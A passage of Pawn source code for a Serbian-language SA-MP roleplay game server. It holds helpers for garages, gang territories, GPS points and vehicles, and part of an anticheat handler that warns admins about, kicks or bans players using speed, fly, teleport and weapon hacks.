	fwrite(file, coordsstring);
	fclose(file);
	return 1;
}

stock razdvoji(const strsrc[], strdest[][], delimiter)
{
    new i, li;
    new aNum;
    new len;
    while(i <= strlen(strsrc))
    {
        if(strsrc[i] == delimiter || i == strlen(strsrc))
        {
            len = strmid(strdest[aNum], strsrc, li, i, 128);
            strdest[aNum][len] = 0;
            li = i+1;
            aNum++;
        }
        i++;
    }
    return 1;
}
forward Konektovano();
public Konektovano()
{
	new Connected;
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && !IsPlayerNPC(i)) Connected++;
	return Connected;
}
//------------------------------------------------------------------------------
stock GetFactionType( playerid ) {
	if( PlayerInfo[ playerid ][ xClan ] == 0 )
	    return 0;

	return ( OI[ PlayerInfo[ playerid ][ xClan ] ][ oTip ] );
}
//------------------------------------------------------------------------------
stock SendClientMessageEx(playerid, color, const str[], {Float,_}:...) {
	static
	    args,
	    start,
	    end,
	    string[144]
	;
	#emit LOAD.S.pri 8
	#emit STOR.pri args

	if(args > 12)
	{
		#emit ADDR.pri str
		#emit STOR.pri start

	    for (end = start + (args - 12); end > start; end -= 4)
		{
	        #emit LREF.pri end
	        #emit PUSH.pri
		}
		#emit PUSH.S str
		#emit PUSH.C 144
		#emit PUSH.C string
		#emit PUSH.C args
		#emit SYSREQ.C format

		SendClientMessage(playerid, color, string);

		#emit LCTRL 5
		#emit SCTRL 4
		#emit RETN
	}
	return SendClientMessage(playerid, color, str);
}
//------------------------------------------------------------------------------
ResetAllFarmPlants( ) {
	for( new i = 0; i < MAX_FARMS; i++ ) {
		ResetFarmPlant( i );
	}
}
//------------------------------------------------------------------------------
ResetFarmPlant( plantid ) {
	if( plantid != -1 ) {
        plantInfo[ plantid ][ farmPlayerID ] = IPI;
        plantInfo[ plantid ][ farmPlantCreated ] = false;
        plantInfo[ plantid ][ farmWheatCreated ] = false;
        plantInfo[ plantid ][ farmObject ] = INVALID_OBJECT_ID;
        plantInfo[ plantid ][ farm3D ] = Text3D:INVALID_3DTEXT_ID;
	}
	return -1;
}
//----------------------------------------------------------------------------
stock IsCheatPosition( playerid ) {
	for( new i = 0; i < sizeof( CheatPositions );i++ )
	    if( IsPlayerInRangeOfPoint( playerid, 5.0, CheatPositions[ i ][ 0 ], CheatPositions[ i ][ 1 ], CheatPositions[ i ][ 2 ] ) )
	        return true;
	return false;
}
//------------------------------------------------------------------------------
stock UpdateGorivoLabel( ) {

    new gorivostring[ 256 ];

	format( gorivostring, sizeof( gorivostring ), ""col_white"Trenutno ima "col_crvena"%dL "col_white"goriva\n"col_white"Da napunis vozilo kucajte\n"col_crvena"[ /fill ]\n"col_white"Da kupite kanticu kucajte\n"col_crvena"[ /kupikanticu ]", ServerInfo[ Gorivo ] );

	for( new i = 0; i < 14; i++ ) {

		UpdateDynamic3DTextLabelText( ServerInfo[ GorivoLabel ][ i ], BELA, gorivostring );

	}
	return 1;
}
//------------------------------------------------------------------------------
stock PlayerHasTazer( playerid ) {
	return ( GetPlayerWeapon( playerid ) == 23 && ImaTazer[ playerid ] );
}
//------------------------------------------------------------------------------
stock NextGZoneID(const len) {
    new id = (-1);
    for( new loop = ( 0 ), provjera = ( -1 ), Data_[ 64 ] = "\0"; loop != len; ++ loop ) {
       provjera = ( loop+1 );
       format( Data_, ( sizeof Data_ ), F_GZONE, provjera );
       if(!fexist(Data_)) {
          id = ( provjera );
          break; } }
  	return ( id );
}
//------------------------------------------------------------------------------
stock NextRadarID(const len) {
    new id = (-1);
    for( new loop = ( 0 ), provjera = ( -1 ), Data_[ 64 ] = "\0"; loop != len; ++ loop ) {
       provjera = ( loop+1 );
       format( Data_, ( sizeof Data_ ), F_RADARS, provjera );
       if(!fexist(Data_)) {
          id = ( provjera );
          break; } }
  	return ( id );
}
//------------------------------------------------------------------------------
stock NextFieldID(const len) {
    new id = (-1);
    for( new loop = ( 0 ), provjera = ( -1 ), Data_[ 64 ] = "\0"; loop != len; ++ loop ) {
       provjera = ( loop+1 );
       format( Data_, ( sizeof Data_ ), F_FIELD, provjera );
       if(!fexist(Data_)) {
          id = ( provjera );
          break; } }
  	return ( id );
}
//------------------------------------------------------------------------------
stock NextGPSID(const len) {
    new id = (-1);
    for( new loop = ( 0 ), provjera = ( -1 ), Data_[ 64 ] = "\0"; loop != len; ++ loop ) {
       provjera = ( loop+1 );
       format( Data_, ( sizeof Data_ ), F_GPS, provjera );
       if(!fexist(Data_)) {
          id = ( provjera );
          break; } }
  	return ( id );
}

forward GPS_Save( id );
public GPS_Save( id ) {
	new iFile[ 60 ];
    format( iFile, sizeof( iFile ), F_GPS, id );
	new INI:File = INI_Open( iFile );
    INI_WriteString( File, "Name", gpsInfo[ id ][ gpsName ] );
	INI_WriteFloat( File, "PosX", gpsInfo[ id ][ gpsPos ][ 0 ] );
	INI_WriteFloat( File, "PosY", gpsInfo[ id ][ gpsPos ][ 1 ] );
	INI_WriteFloat( File, "PosZ", gpsInfo[ id ][ gpsPos ][ 2 ] );
	INI_Close( File );
	return (true);
}

forward LoadGPS( id, name[], value[] );
public LoadGPS( id, name[], value[] ) {

    INI_String( "Name", gpsInfo[ id ][ gpsName ], 50  );
	INI_Float( "PosX", gpsInfo[ id ][ gpsPos ][ 0 ] );
	INI_Float( "PosY", gpsInfo[ id ][ gpsPos ][ 1 ] );
	INI_Float( "PosZ", gpsInfo[ id ][ gpsPos ][ 2 ] );
	return (true);
}

//------------------------------------------------------------------------------
stock NextGarageID(const len) {
    new id = (-1);
    for( new loop = ( 0 ), provjera = ( -1 ), Data_[ 64 ] = "\0"; loop != len; ++ loop ) {
       provjera = ( loop+1 );
       format( Data_, ( sizeof Data_ ), F_GARAGE, provjera );
       if(!fexist(Data_)) {
          id = ( provjera );
          break; } }
  	return ( id );
}
//------------------------------------------------------------------------------
ResetGarage( id ) {
	garageInfo[ id ][ garageOwned ] = false;
	strmid( garageInfo[ id ][ garageOwned ], "Drzava", 0, strlen( "Drzava" ), MAX_PLAYER_NAME );
	garageInfo[ id ][ garagePrice ] = 0;
	garageInfo[ id ][ garageLevel ] = 0;
	garageInfo[ id ][ garageLocked ] = false;
	garageInfo[ id ][ garagePos ][ 0 ] = 0.0;
	garageInfo[ id ][ garagePos ][ 1 ] = 0.0;
	garageInfo[ id ][ garagePos ][ 2 ] = 0.0;
	garageInfo[ id ][ garageVehiclePos ][ 0 ] = 0.0;
	garageInfo[ id ][ garageVehiclePos ][ 1 ] = 0.0;
	garageInfo[ id ][ garageVehiclePos ][ 2 ] = 0.0;
	garageInfo[ id ][ garageVehiclePos ][ 3 ] = 0.0;
	garageInfo[ id ][ garageVW ] = 0;
	garageInfo[ id ][ garageType ] = -1;
}

GetNearestGarage( playerid ) {

    for( new i = 1; i < MAX_GARAGES; i++) {

        if( IsPlayerInRangeOfPoint( playerid, 3.0, garageInfo[ i ][ garagePos ][ 0 ], garageInfo[ i ][  garagePos ][ 1 ], garageInfo[ i ][ garagePos ][ 2 ] ) ) { return i; }
	}
	return -1;
}

GetNearestRadar( playerid ) {

    for( new i = 1; i < MAX_RADARS; i++) {

        if( IsPlayerInRangeOfPoint( playerid, 10.0, radarInfo[ i ][ radarPos ][ 0 ], radarInfo[ i ][  radarPos ][ 1 ], radarInfo[ i ][ radarPos ][ 2 ] ) ) { return i; }
	}
	return -1;
}

forward Garage_Save( id );
public Garage_Save( id ) {
	new iFile[ 40 ];
    format( iFile, sizeof( iFile ), F_GARAGE, id );
	new INI:File = INI_Open( iFile );
	INI_WriteBool( File, "Owned", garageInfo[ id ][ garageOwned ] );
    INI_WriteString( File, "Owner", garageInfo[ id ][ garageOwner ] );
    INI_WriteInt( File, "Price", garageInfo[ id ][ garagePrice ] );
    INI_WriteInt( File, "Level", garageInfo[ id ][ garageLevel ] );
    INI_WriteBool( File, "Locked", garageInfo[ id ][ garageLocked ] );
	INI_WriteFloat( File, "Pos1", garageInfo[ id ][ garagePos ][ 0 ] );
	INI_WriteFloat( File, "Pos2", garageInfo[ id ][ garagePos ][ 1 ] );
	INI_WriteFloat( File, "Pos3", garageInfo[ id ][ garagePos ][ 2 ] );
	INI_WriteFloat( File, "VehiclePos1", garageInfo[ id ][ garageVehiclePos ][ 0 ] );
	INI_WriteFloat( File, "VehiclePos2", garageInfo[ id ][ garageVehiclePos ][ 1 ] );
	INI_WriteFloat( File, "VehiclePos3", garageInfo[ id ][ garageVehiclePos ][ 2 ] );
	INI_WriteFloat( File, "VehiclePos4", garageInfo[ id ][ garageVehiclePos ][ 3 ] );
	INI_WriteInt( File, "VW", garageInfo[ id ][ garageVW ] );
	INI_WriteInt( File, "Type", garageInfo[ id ][ garageType ] );
	INI_Close( File );
	return (true);
}

forward LoadGarages( id, name[], value[] );
public LoadGarages( id, name[], value[] ) {

	INI_Bool( "Owned", garageInfo[ id ][ garageOwned ] );
    INI_String( "Owner", garageInfo[ id ][ garageOwner ], MAX_PLAYER_NAME );
    INI_Int( "Price", garageInfo[ id ][ garagePrice ] );
    INI_Int( "Level", garageInfo[ id ][ garageLevel ] );
    INI_Bool( "Locked", garageInfo[ id ][ garageLocked ] );
	INI_Float( "Pos1", garageInfo[ id ][ garagePos ][ 0 ] );
	INI_Float( "Pos2", garageInfo[ id ][ garagePos ][ 1 ] );
	INI_Float( "Pos3", garageInfo[ id ][ garagePos ][ 2 ] );
	INI_Float( "VehiclePos1", garageInfo[ id ][ garageVehiclePos ][ 0 ] );
	INI_Float( "VehiclePos2", garageInfo[ id ][ garageVehiclePos ][ 1 ] );
	INI_Float( "VehiclePos3", garageInfo[ id ][ garageVehiclePos ][ 2 ] );
	INI_Float( "VehiclePos4", garageInfo[ id ][ garageVehiclePos ][ 3 ] );
	INI_Int( "VW", garageInfo[ id ][ garageVW ] );
	INI_Int( "Type", garageInfo[ id ][ garageType ] );
	return (true);
}

Garage_Refresh( id ) {
	new filename[ 32 ],
	        vrsta[ 20 ],
				string[ 256 ];

	if( id  != -1 ) {

		format( filename, sizeof( filename ), F_GARAGE, id );

		if( fexist( filename ) ) {

		    if( IsValidDynamic3DTextLabel( garageInfo[ id ][ garage3D ] ) )
		    	DestroyDynamic3DTextLabel( garageInfo[ id ][ garage3D ] );

	    	if( IsValidDynamicPickup( garageInfo[ id ][ garagePickup ] ) )
		    	DestroyDynamicPickup( garageInfo[ id ][ garagePickup ] );

			switch( garageInfo[ id ][ garageType ] ) {
			    case 0: {
					vrsta = "Mala garaza";
				}
				case 1: {
					vrsta = "Srednja garaza";
				}
				case 2: {
					vrsta = "Velika garaza";
				}
			}

		    if( !garageInfo[ id ][ garageOwned ] ) {
		    	format( string, sizeof( string ), ""col_orange"Garaza na prodaju"col_white"[ID %d]\n"col_orange"Tip garaze: "col_white"%s\n"col_orange"Cena garaze: "col_white"%d\n"col_orange"Potreban level: "col_white"%d\n"col_orange"Za kupovinu kucajte "col_white"/kupigarazu", id, vrsta, garageInfo[ id ][ garagePrice ], garageInfo[ id ][ garageLevel ] );
			}
			else if( garageInfo[ id ][ garageOwned ] ) {
			    format( string, sizeof( string ), ""col_white"[ID %d]"col_orange"Vlasnik: "col_white"%s\n"col_orange"Tip garaze: "col_white"%s\n"col_orange"Potreban level: "col_white"%d\n"col_orange"Za ulaz koristite "col_white"/genter", id, garageInfo[ id ][ garageOwner ], vrsta, garageInfo[ id ][ garageLevel ] );
			}
			garageInfo[ id ][ garage3D ] = CreateDynamic3DTextLabel( string, BELA, garageInfo[ id ][ garagePos ][ 0 ], garageInfo[ id ][ garagePos ][ 1 ], garageInfo[ id ][ garagePos ][ 2 ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0 );
			garageInfo[ id ][ garagePickup ] = CreateDynamicPickup( 19130, 1, garageInfo[ id ][ garagePos ][ 0 ], garageInfo[ id ][ garagePos ][ 1 ], garageInfo[ id ][ garagePos ][ 2 ], 0, 0 );

		}
	}
}

//------------------------------------------------------------------------------

GZone_Reset( id ) {

	gZoneInfo[ id ][ gZoneTaken ] = false;
	gZoneInfo[ id ][ gZoneTakeable ] = false;
    gZoneInfo[ id ][ gZoneGangID ] = -1;
    gZoneInfo[ id ][ gZoneTime ] = 0;
    gZoneInfo[ id ][ gZoneMaxX ] = 0.0;
    gZoneInfo[ id ][ gZoneMinX ] = 0.0;
    gZoneInfo[ id ][ gZoneMaxY ] = 0.0;
    gZoneInfo[ id ][ gZoneMinY ] = 0.0;
    gZoneInfo[ id ][ gZonePickupPos ][ 0 ] = 0.0;
    gZoneInfo[ id ][ gZonePickupPos ][ 1 ] = 0.0;
    gZoneInfo[ id ][ gZonePickupPos ][ 2 ] = 0.0;
}

forward GZone_Load( id, name[], value[] );
public GZone_Load( id, name[], value[] ) {
    
    INI_Bool( "Taken", gZoneInfo[ id ][ gZoneTaken ] );
    INI_Bool( "Takeable", gZoneInfo[ id ][ gZoneTakeable ] );
    INI_Int( "GangID", gZoneInfo[ id ][ gZoneGangID ] );
    INI_Int( "Time", gZoneInfo[ id ][ gZoneTime ]);
	INI_Float( "MaxX", gZoneInfo[ id ][ gZoneMaxX ] );
    INI_Float( "MinX", gZoneInfo[ id ][ gZoneMinX ] );
    INI_Float( "MaxY", gZoneInfo[ id ][ gZoneMaxY ] );
    INI_Float( "MinY", gZoneInfo[ id ][ gZoneMinY ] );
    INI_String( "Color", gZoneInfo[ id ][ gZoneColor ], 24 );
    INI_Float( "PickupPosX", gZoneInfo[ id ][ gZonePickupPos ][ 0 ] );
    INI_Float( "PickupPosY", gZoneInfo[ id ][ gZonePickupPos ][ 1 ] );
    INI_Float( "PickupPosZ", gZoneInfo[ id ][ gZonePickupPos ][ 2 ] );
    INI_Int("Vrsta", gZoneInfo[id][gZoneVrsta]);
    
	return (true);
}

GetNearestGZone( playerid ) {

	new Float:Pos[ 4 ];
	GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
    for( new id = 1; id < MAX_GZONE; id++ ) {
		if( Pos[ 0 ] <= gZoneInfo[ id ][ gZoneMaxX ] && Pos[ 0 ] >= gZoneInfo[ id ][ gZoneMinX ] && Pos[ 1 ] <= gZoneInfo[ id ][ gZoneMaxY ] && Pos[ 1 ] >= gZoneInfo[ id ][ gZoneMinY ] ) {
			return id;
		}
	}
	return -1;
}

GZone_Refresh( id ) {

	new filename[ 32 ], string[ 256 ];

	if( id  != -1 ) {

		format( filename, sizeof( filename ), F_GZONE, id );

		if( fexist( filename ) ) {

		    if( IsValidDynamic3DTextLabel( gZoneInfo[ id ][ gZone3D ] ) )
		    	DestroyDynamic3DTextLabel( gZoneInfo[ id ][ gZone3D ] );

	    	if( IsValidDynamicPickup( gZoneInfo[ id ][ gZonePickup ] ) )
		    	DestroyDynamicPickup( gZoneInfo[ id ][ gZonePickup ] );

			if( !gZoneInfo[ id ][ gZoneTaken ] ) {

				gZoneInfo[ id ][ gZonePickup ] = CreateDynamicPickup( 1313, 1, gZoneInfo[ id ][ gZonePickupPos ][ 0 ], gZoneInfo[ id ][ gZonePickupPos ][ 1 ], gZoneInfo[ id ][ gZonePickupPos ][ 2 ], 0, 0 );
                format(string, sizeof(string), ""col_white"[ TERITORIJA ]\nTeritorija je "col_crvena"slobodna"col_white"\nVrsta Zone : "col_crvena"%s"col_white"\nAko zelis da je zauzmes kucaj "col_crvena"/zauzmi", getZoneType(id));
				gZoneInfo[ id ][ gZone3D ] = CreateDynamic3DTextLabel( string, BELA, gZoneInfo[ id ][ gZonePickupPos ][ 0 ], gZoneInfo[ id ][ gZonePickupPos ][ 1 ], gZoneInfo[ id ][ gZonePickupPos ][ 2 ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0 );
			}
			else if( gZoneInfo[ id ][ gZoneTaken ] ) {
			
			    gZoneInfo[ id ][ gZonePickup ] = CreateDynamicPickup( 1313, 1, gZoneInfo[ id ][ gZonePickupPos ][ 0 ], gZoneInfo[ id ][ gZonePickupPos ][ 1 ], gZoneInfo[ id ][ gZonePickupPos ][ 2 ], 0, 0 );
			    format( string, sizeof( string ), ""col_white"[ TERITORIJA ]\nTeritorija je u vlasnistvu bande "col_crvena"%s"col_white"\nVrsta Zone : "col_crvena"%s"col_white"\nAko zelis da je zauzmes kucaj "col_crvena"/zauzmi",  OI[ gZoneInfo[ id ][ gZoneGangID ] ][ oName ], getZoneType(id) );
			    gZoneInfo[ id ][ gZone3D ] = CreateDynamic3DTextLabel( string, BELA, gZoneInfo[ id ][ gZonePickupPos ][ 0 ], gZoneInfo[ id ][ gZonePickupPos ][ 1 ], gZoneInfo[ id ][ gZonePickupPos ][ 2 ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0 );
			}
		}
	}
}

stock GZone_Save( id ) {

	new iFile[ 40 ];
    format( iFile, sizeof( iFile ), F_GZONE, id );
	new INI:File = INI_Open( iFile );
	INI_WriteBool( File, "Taken", gZoneInfo[ id ][ gZoneTaken ] );
	INI_WriteBool( File, "Takeable", gZoneInfo[ id ][ gZoneTakeable ] );
    INI_WriteInt( File, "GangID", gZoneInfo[ id ][ gZoneGangID ] );
    INI_WriteInt( File, "Time", gZoneInfo[ id ][ gZoneTime ] );
	INI_WriteFloat( File, "MaxX", gZoneInfo[ id ][ gZoneMaxX ] );
    INI_WriteFloat( File, "MinX", gZoneInfo[ id ][ gZoneMinX ] );
    INI_WriteFloat( File, "MaxY", gZoneInfo[ id ][ gZoneMaxY ] );
    INI_WriteFloat( File, "MinY", gZoneInfo[ id ][ gZoneMinY ] );
    INI_WriteString( File, "Color", gZoneInfo[ id ][ gZoneColor ] );
    INI_WriteFloat( File, "PickupPosX", gZoneInfo[ id ][ gZonePickupPos ][ 0 ] );
    INI_WriteFloat( File, "PickupPosY", gZoneInfo[ id ][ gZonePickupPos ][ 1 ] );
    INI_WriteFloat( File, "PickupPosZ", gZoneInfo[ id ][ gZonePickupPos ][ 2 ] );
    INI_WriteInt(File, "Vrsta", gZoneInfo[id][gZoneVrsta]);
	INI_Close( File );
	
	return (true);
}

//------------------------------------------------------------------------------

stock IsCordsInOtherGZone( Float:x, Float:y ) {
    for( new id = 1; id < MAX_GZONE; id++) {
		if( x <= gZoneInfo[ id ][ gZoneMaxX ] && x >= gZoneInfo[ id ][ gZoneMinX ] && y <= gZoneInfo[ id ][ gZoneMaxY ] && y >= gZoneInfo[ id ][ gZoneMinY ] ) {
			return id;
		}
	}
	return -1;
}

stock IsCordsInGZone( id, Float:x, Float:y ) {

	if( x <= gZoneInfo[ id ][ gZoneMaxX ] && x >= gZoneInfo[ id ][ gZoneMinX ] && y <= gZoneInfo[ id ][ gZoneMaxY ] && y >= gZoneInfo[ id ][ gZoneMinY ] ) {
		return id;
	}
	return -1;
}

//------------------------------------------------------------------------------
forward Novi_DestroyVehicle( vehicleid );
public Novi_DestroyVehicle( vehicleid ) {

	if( vehicleid != -1 ) {
	    if( Neon[ vehicleid ] == 1 ) {
			Neon[ vehicleid ] = 0;
	  		DestroyDynamicObject( NeonObject1[ vehicleid ] );
		   	DestroyDynamicObject( NeonObject2[ vehicleid ] );
		}
		RealVehiclePositions[ vehicleid ][ 0 ] = 0.0;
		RealVehiclePositions[ vehicleid ][ 1 ] = 0.0;
		RealVehiclePositions[ vehicleid ][ 2 ] = 0.0;
	}
	
	if( DestroyVehicle( vehicleid ) ) {
        Iter_Remove(serverVehicles, vehicleid);
	    ServerInfo[ BrojKreiranihVozila ]--;
		return 1;
	}
	else return -1;
}
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

Novi_SetVehicleHealth( vehicleid, Float:vHealth ) {

	if( antiCheatVS[ vehicleid ][ VehCheck ] == 1 ) antiCheatVS[ vehicleid ][ VehCheck ] = 2;
	antiCheatVS[ vehicleid ][ VehTrueHealth ] = vHealth;
	SetVehicleHealth( vehicleid, vHealth );
	if( antiCheatVS[ vehicleid ][ VehCheck ] == 2 ) antiCheatVS[ vehicleid ][ VehCheck ] = 1;

	return 1;
}

Novi_RepairVehicle( playerid, vehicleid ) {

    if( antiCheatVS[ vehicleid ][ VehCheck ] == 1 ) antiCheatVS[ vehicleid ][ VehCheck ] = 2;
    antiCheatCS[ playerid ][ CPSCount ] = 0;
	antiCheatCS[ playerid ][ CPSTick ] = 0;
	antiCheatCS[ playerid ][ VehRepairTime ] = 3;
	RepairVehicle( vehicleid );
    GetVehicleHealth( vehicleid, antiCheatVS[ vehicleid ][ VehTrueHealth ] );
    if( antiCheatVS[ vehicleid ][ VehCheck ] == 2 ) antiCheatVS[ vehicleid ][ VehCheck ] = 1;

	return 1;
}
//------------------------------------------------------------------------------
stock CreateBanFile( playerid, reason[ ], admin[ ] ) {

	new banfile[ 80 ];
	format( banfile, sizeof( banfile ), FILE_BAN, ImeIgraca( playerid ) );
	new File:ban = fopen( banfile, io_write );
	new var[ 64 ];
	format( var, 64, "Admin=%s\n", admin );
	fwrite( ban, var );
	new var1[ 128 ];
	format( var1, 128,"Razlog=%s\n", reason );
	fwrite( ban, var1 );
	fclose( ban );

}
//------------------------------------------------------------------------------

//------------------------------------------------------------------------------
IsPlayerAtVehicleRepairPoint( playerid ) {
 	if( GetPlayerCameraMode( playerid ) == 15 ) return 1;
    if( IsPlayerInRangeOfPoint( playerid, 25.0, 2067.00, -1831.65, 13.55)) return 1;
    if( IsPlayerInRangeOfPoint( playerid, 25.0, 1024.97, -1023.88, 32.10)) return 1;
    if( IsPlayerInRangeOfPoint( playerid, 25.0, 1041.19, -1022.50, 32.11)) return 1;
    if( IsPlayerInRangeOfPoint( playerid, 25.0, 720.25, -457.17, 16.34)) return 1;
    if( IsPlayerInRangeOfPoint( playerid, 25.0, 2386.66, 1045.68, 10.82)) return 1;
    if( IsPlayerInRangeOfPoint( playerid, 25.0, 1972.50, 2163.03, 11.07)) return 1;
    if( IsPlayerInRangeOfPoint( playerid, 25.0, -1420.58, 2586.17, 55.84)) return 1;
    if( IsPlayerInRangeOfPoint( playerid, 25.0, -1904.90, 283.96, 41.05)) return 1;
    if( IsPlayerInRangeOfPoint( playerid, 25.0, -2719.46, 217.77, 4.48)) return 1;
	return 0;
}
//------------------------------------------------------------------------------
getCheatPower( bool:antic ) {
	new acn[4] = "ON";

    if( antic == true ) acn = "ON";
	else if( antic == false ) acn = "OFF";

	return acn;
}
getCheatWork( antic ) {
	new acn[10] = "Warning";

    if( antic == AC_ADMINPORUKA ) acn = "Warning";
	else if( antic == AC_KICK ) acn = "Kick";
	else if( antic == AC_BAN ) acn = "Ban";

	return acn;
}
//------------------------------------------------------------------------------
forward OnPlayerCheat( playerid, type, source, source2 );
public OnPlayerCheat( playerid, type, source, source2 ) {
	if(PlayerInfo[playerid][xAdmin] == 7 && AdminDuty[playerid]) return 0;
    switch( type ) {
        case DETECT_WEAPON_HACK: {
            if( antiCheatSS[ antiWeaponH ] == true ) {
				switch( antiCheatSS[ WeaponHRezimRada ] ) {
				    case AC_ADMINPORUKA: {

				        format( globalstring, sizeof( globalstring ), "| V:AC | Oruzje || %s[ID: %d] | %s: !", ImeIgraca( playerid ), playerid, WeapNames[ antiCheatCS[ playerid ][ TakenWeapon ] ] );
			            AdminPoruka( ANTICHEAT, globalstring );

						ResetAllWeapons( playerid );
				    }
				 //    case AC_KICK: {

				 //        format( globalstring, sizeof( globalstring ), "| V:AC | %s je kickovan sa servera. Razlog: "col_white"Weapon hack", ImeIgraca( playerid ) );
					// 	AdminPoruka( SVETLOCRVENA, globalstring );
					// 	Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Weapon hack");

				 //    }
				 //    case AC_BAN: {
				 //        ResetAllWeapons( playerid );
	    //                 antiCheatCS[ playerid ][ WeaponHack ]++;
		   //              if( antiCheatCS[ playerid ][ WeaponHack ] >= 3 ) {
					//         format( globalstring, sizeof( globalstring ), "| V:AC | %s je banovan sa servera. Razlog: "col_white"Weapon hack", ImeIgraca( playerid ) );
					// 		AdminPoruka( SVETLOCRVENA, globalstring );

					// 	    CreateBanFile( playerid, "Weapon Hack", "AntiCheat" );

					// 		Kickovanje( playerid, ""col_white"Ti si banovan sa servera. Razlog: "col_crvena"Weapon hack");
					// 	}
					// }
				}
			}
        }
        case DETECT_AMMO_HACK: {
            if( antiCheatSS[ antiWeaponH ] == true ) {
				switch( antiCheatSS[ WeaponHRezimRada ] ) {
				    case AC_ADMINPORUKA: {

				        format( globalstring, sizeof( globalstring ), "| V:AC | Municija || %s[ID: %d] | %s: %d | Max moze imati: %d!", ImeIgraca( playerid ), playerid, WeapNames[ antiCheatCS[ playerid ][ TakenWeapon ] ], source, source2 );
				        AdminPoruka( ANTICHEAT, globalstring );

		                ResetAllWeapons( playerid );
				    }
				 //    case AC_KICK: {

				 //        format( globalstring, sizeof( globalstring ), "| V:AC | %s je kickovan sa servera. Razlog: "col_white"Ammo hack", ImeIgraca( playerid ) );
					// 	AdminPoruka( SVETLOCRVENA, globalstring );
					// 	Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Ammo hack");

				 //    }
				 //    case AC_BAN: {
				 //        ResetAllWeapons( playerid );
		   //              antiCheatCS[ playerid ][ WeaponHack ]++;
			  //           if( antiCheatCS[ playerid ][ WeaponHack ] >= 3 ) {
					// 		format( globalstring, sizeof( globalstring ), "| V:AC | %s je banovan sa servera. Razlog: "col_white"Ammo hack", ImeIgraca( playerid ) );
					// 		AdminPoruka( SVETLOCRVENA, globalstring );

     //                        CreateBanFile( playerid, "Ammo Hack", "AntiCheat" );

					// 		Kickovanje( playerid, ""col_white"Ti si banovan sa servera. Razlog: "col_crvena"Ammo hack");
					// 	}
					// }
				}
			}
		}
		case DETECT_TELEPORT_HACK: {
		    if( antiCheatSS[ antiTeleportH ] == true ) {
		    	switch( antiCheatSS[ TeleportHRezimRada ] ) {
				    case AC_ADMINPORUKA: {

				        format( globalstring, sizeof( globalstring ), "| V:AC | Moguce portanje || %s[ID: %d] | Koristi /spec!!!", ImeIgraca( playerid ), playerid );
		        		AdminPoruka( ANTICHEAT, globalstring );

				    }
				  //   case AC_KICK: {

				  //       format( globalstring, sizeof( globalstring ), "| V:AC | %s je kickovan sa servera. Razlog: "col_white"Teleport hack", ImeIgraca( playerid ) );
						// AdminPoruka( SVETLOCRVENA, globalstring );
						// Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Teleport hack");

				  //   }
				  // 	case AC_BAN: {

				  // 	    format( globalstring, sizeof( globalstring ), "| V:AC | %s je banovan sa servera. Razlog: "col_white"Teleport hack", ImeIgraca( playerid ) );
						// AdminPoruka( SVETLOCRVENA, globalstring );

      //                   CreateBanFile( playerid, "Teleport Hack", "AntiCheat" );

						// Kickovanje( playerid, ""col_white"Ti si banovan sa servera. Razlog: "col_crvena"Teleport hack");

				  // 	}
				}
			}
		}
		case DETECT_FLY_HACK: {
            if( antiCheatSS[ antiFlyH ] == true ) {
            	if(IgracLeti{playerid}) return 0;
				switch( antiCheatSS[ FlyHRezimRada ] ) {
				    case AC_ADMINPORUKA: {
				        format( globalstring, sizeof( globalstring ), "| V:AC | Moguc fly hack || %s[ID: %d] | Koristi /spec!!!", ImeIgraca( playerid ), playerid );
		        		AdminPoruka( ANTICHEAT, globalstring );
				    }
				  //   case AC_KICK: {
				  //       format( globalstring, sizeof( globalstring ), "| V:AC | %s je kickovan sa servera. Razlog: "col_white"Fly hack", ImeIgraca( playerid ) );
						// AdminPoruka( SVETLOCRVENA, globalstring );
						// Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Fly hack");
				  //   }
				  // 	case AC_BAN: {
				  // 	    format( globalstring, sizeof( globalstring ), "| V:AC | %s je banovan sa servera. Razlog: "col_white"Fly hack", ImeIgraca( playerid ) );
						// AdminPoruka( SVETLOCRVENA, globalstring );

      //                   CreateBanFile( playerid, "Fly Hack", "AntiCheat" );

						// Kickovanje( playerid, ""col_white"Ti si banovan sa servera. Razlog: "col_crvena"Fly hack");
				  // 	}
				}
			}
		}
		case DETECT_SPEED_HACK: {
            if( antiCheatSS[ antiSpeedH ] == true ) {
				switch( antiCheatSS[ SpeedHRezimRada ] ) {
				    case AC_ADMINPORUKA: {

				        format( globalstring, sizeof( globalstring ), "| V:AC | Moguc speed hack || %s[ID: %d] | Koristi /spec!!!", ImeIgraca( playerid ), playerid );
			   			AdminPoruka( ANTICHEAT, globalstring);

				    }
				    case AC_KICK: {
				        antiCheatCS[ playerid ][ SpeedHack ]++;
						if( antiCheatCS[ playerid ][ SpeedHack ] == 3 ) {

							antiCheatCS[ playerid ][ SpeedHack ] = 0;

							format( globalstring, sizeof( globalstring ), "| V:AC | %s je kickovan sa servera. Razlog: "col_white"Speed hack", ImeIgraca( playerid ) );
							AdminPoruka( SVETLOCRVENA, globalstring );

							Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Speed hack");
						}
				    }
				    case AC_BAN: {
				        antiCheatCS[ playerid ][ SpeedHack ]++;
						if( antiCheatCS[ playerid ][ SpeedHack ] == 3 ) {

							format( globalstring, sizeof( globalstring ), "| V:AC | %s je banovan sa servera. Razlog: "col_white"Speed hack", ImeIgraca( playerid ) );
							AdminPoruka( SVETLOCRVENA, globalstring );

							CreateBanFile( playerid, "Speed Hack", "AntiCheat" );

							Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Speed hack");
						}
				    }
				}
			}
		}
		case DETECT_JETPACK_HACK: {
		    if( antiCheatSS[ antiJetPackH ] == true ) {
		        switch( antiCheatSS[ JetPackHRezimRada ] ) {
				    case AC_ADMINPORUKA: {

